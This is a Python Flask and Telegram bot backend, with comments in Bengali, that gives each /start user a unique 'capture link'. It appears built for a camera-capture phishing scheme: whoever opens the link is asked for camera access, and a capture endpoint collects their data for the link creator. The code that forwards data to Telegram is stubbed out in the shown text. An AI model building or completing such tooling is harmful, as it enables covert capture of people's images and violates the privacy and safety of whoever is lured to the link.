import os
import uuid
import logging
import base64
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv
from io import BytesIO
import asyncio

load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN')
PORT = int(os.getenv('PORT', 5000))
FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://your-frontend.vercel.app')
WEBHOOK_URL = os.getenv('RENDER_EXTERNAL_URL', f'https://localhost:{PORT}')  # Render স্বয়ংক্রিয়ভাবে দেয়

# লগিং
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask অ্যাপ
app = Flask(__name__)
CORS(app)

# ইউজার সেশন স্টোর
user_sessions = {}

# টেলিগ্রাম অ্যাপ্লিকেশন (Webhook-এর জন্য)
telegram_app = None

# ================== টেলিগ্রাম বট হ্যান্ডলার ==================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /start কমান্ড - ইউনিক URL তৈরি করে """
    user_id = update.effective_user.id
    username = update.effective_user.username or 'User'
    
    session_id = str(uuid.uuid4())
    
    user_sessions[session_id] = {
        'telegram_user_id': user_id,
        'username': username,
        'created_at': datetime.now().isoformat()
    }
    
    unique_url = f"{FRONTEND_URL}/?session={session_id}"
    
    await update.message.reply_text(
        f"🎯 হ্যালো @{username}!\n\n"
        f"আপনার পার্সোনাল ক্যাপচার লিংক:\n\n"
        f"{unique_url}\n\n"
        f"👉 এই লিংকে ক্লিক করুন এবং ক্যামেরা এক্সেস দিন"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /help কমান্ড """
    await update.message.reply_text("/start - নতুন ক্যাপচার লিংক তৈরি করুন")

# ================== Flask রুট ==================

@app.route('/')
def home():
    return jsonify({'status': 'Bot is running'})

@app.route('/health', methods=['GET'])
def health():
    """Render-এর হেলথ চেকের জন্য"""
    return jsonify({'status': 'healthy'}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """টেলিগ্রাম থেকে Webhook রিকোয়েস্ট হ্যান্ডল করে"""
    if telegram_app:
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        asyncio.run(telegram_app.process_update(update))
    return '', 200

@app.route('/api/validate/<session_id>', methods=['GET'])
def validate_session(session_id):
    if session_id in user_sessions:
        return jsonify({'valid': True})
    return jsonify({'valid': False}), 404

@app.route('/api/capture/<session_id>', methods=['POST'])
def capture_data(session_id):
    if session_id not in user_sessions:
        return jsonify({'error': 'Invalid session'}), 404
    
    session = user_sessions[session_id]
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    
    try:
        # এখানে টেলিগ্রামে ডাটা পাঠানোর কোড (আগের মতো)
        # ... 
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

# ================== বট সেটআপ ফাংশন ==================

async def setup_webhook():
    """Webhook সেটআপ করে"""
    global telegram_app
    
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    telegram_app.add_handler(CommandHandler("start", start_command))
    telegram_app.add_handler(CommandHandler("help", help_command))
    
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(f"{WEBHOOK_URL}/webhook")
    
    logger.info(f"Webhook set to: {WEBHOOK_URL}/webhook")

# ================== মেইন ==================

if __name__ == '__main__':
    # Webhook সেটআপ
    asyncio.run(setup_webhook())
    
    # Flask অ্যাপ চালান
    app.run(host='0.0.0.0', port=PORT, debug=False)
